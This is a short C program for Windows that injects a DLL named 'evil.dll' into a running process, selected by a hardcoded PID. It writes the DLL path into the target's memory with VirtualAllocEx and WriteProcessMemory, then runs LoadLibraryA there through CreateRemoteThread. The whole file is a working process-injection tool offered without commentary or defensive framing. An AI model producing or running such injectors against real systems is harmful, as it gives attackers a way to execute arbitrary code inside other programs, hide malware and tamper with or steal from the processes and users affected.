#include <windows.h>
#include <stdio.h>
#include "tchar.h"

int _tmain(int argc, _TCHAR* argv[]) {
	char buffer[] = "evil.dll";

	int pid = 19688;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("OpenProcess Error.\n");
		return 1;
	}

	HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
	if (hKernel32 == NULL) {
		printf("GetModuleHandle Error.\n");
		return 1;
	}

	LPVOID addr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
	if (addr == NULL) {
		printf("GetProcAddress Error.\n");
		return 1;
	}

	LPVOID arg = (LPVOID)VirtualAllocEx(hProcess, NULL, strlen(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (arg == NULL) {
		printf("VirtualAllocEx Error.\n");
		return 1;
	}

	int n = WriteProcessMemory(hProcess, arg, buffer, strlen(buffer), NULL);
	if (n == 0) {
		printf("WriteProcessMemory Error.\n");
	}

	HANDLE threadId = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)addr, arg, NULL, NULL);
	if (threadId == NULL) {
		printf("CreateRemoteThread Error.\n");
	}
	else {
		printf("DLL was Injected Successfully ~ \n");
	}

	CloseHandle(hProcess);
	return 0;
}